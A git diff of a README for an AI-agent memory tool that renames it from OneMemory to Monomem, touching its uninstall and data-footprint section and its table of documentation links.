 a memory was retrieved. **Per-token namespace permissions** pin a token to
@@ -501,9 +501,9 @@ negation fix). See [docs/encryption-retention.md](./docs/encryption-retention.md
 
 ## Leaves no trace
 
-OneMemory writes to its data folder (`~/.onememory`) and, through `onememory setup`, to the one `onememory` entry in each
+Monomem writes to its data folder (`~/.monomem`) and, through `monomem setup`, to the one `monomem` entry in each
 app's config, with a backup beside it. Nothing lands in your projects unless you name the folder (`--project`, `--dir`,
-`--out`, `sync --git`), no `CLAUDE.md` is ever written, and every retry has a limit. `onememory uninstall` takes it out
+`--out`, `sync --git`), no `CLAUDE.md` is ever written, and every retry has a limit. `monomem uninstall` takes it out
 of every app (byte for byte where it can), `--purge` also deletes the data after a final backup. Every file, and how to
 remove it: [docs/footprint.md](./docs/footprint.md).
 
@@ -517,8 +517,8 @@ remove it: [docs/footprint.md](./docs/footprint.md).
 | [docs/search.md](./docs/search.md) | semantic, time-aware and relevant search; staleness; consolidation |
 | [docs/change-feed.md](./docs/change-feed.md) | `memory_since` / `GET /changes` |
 | [docs/tasks.md](./docs/tasks.md) | task board, claims, command tasks, handoffs, one-call catch-up |
-| [docs/memory-linter.md](./docs/memory-linter.md) | `ONEMEMORY_LINT`, detection rules, quarantine |
-| [docs/live-claude-code.md](./docs/live-claude-code.md) | `onememory setup` step by step, moving from claude-bridge, checking it in live Claude Code, troubleshooting |
+| [docs/memory-linter.md](./docs/memory-linter.md) | `MONOMEM_LINT`, detection rules, quarantine |
+| [docs/live-claude-code.md](./docs/live-claude-code.md) | `monomem setup` step by step, moving from claude-bridge, checking it in live Claude Code, troubleshooting |
 | [docs/file-sync.md](./docs/file-sync.md) | Markdown export/import, `sync --git` (optionally sealed), GitHub and Syncthing workflows |
 | [docs/sessionstart-hook.md](./docs/sessionstart-hook.md) | automatic recall at Claude Code session start |
 | [docs/encryption-retention.md](./docs/encryption-retention.md) | at-rest encryption, retention (TTL + archive), retrieval visibility |
@@ -526,8 +526,8 @@ remove it: [docs/footprint.md](./docs/footprint.md).
 | [docs/trust.md](./docs/trust.md) | distrust list, writer ids, signed attestations: what each does and does not prove, upgrade and rollback |
 | [docs/token-namespaces.md](./docs/token-namespaces.md) | per-token namespace permissions — one shared bridge, isolated agents |
 | [docs/replacing-memories.md](./docs/replacing-memories.md) | replacing a note in two steps, undo, version history and restore, confidence, the trust guard |
-| [docs/BENCHMARK.md](./docs/BENCHMARK.md) | `onememory bench`: stale memory, contradiction recovery, permission isolation, provenance retention; scenario format; adapting it to another memory system |
-| [docs/footprint.md](./docs/footprint.md) | every file OneMemory writes, where and when, how to remove it; `uninstall`; retry limits |
+| [docs/BENCHMARK.md](./docs/BENCHMARK.md) | `monomem bench`: stale memory, contradiction recovery, permission isolation, provenance retention; scenario format; adapting it to another memory system |
+| [docs/footprint.md](./docs/footprint.md) | every file Monomem writes, where and when, how to remove it; `uninstall`; retry limits |
 | [docs/architecture.md](./docs/architecture.md) | modules, tools, REST API, schema |
 | [SKILL.md](./SKILL.md) | when and how an agent should use the memory |
 | [CHANGELOG.md](./CHANGELOG.md) | release notes |
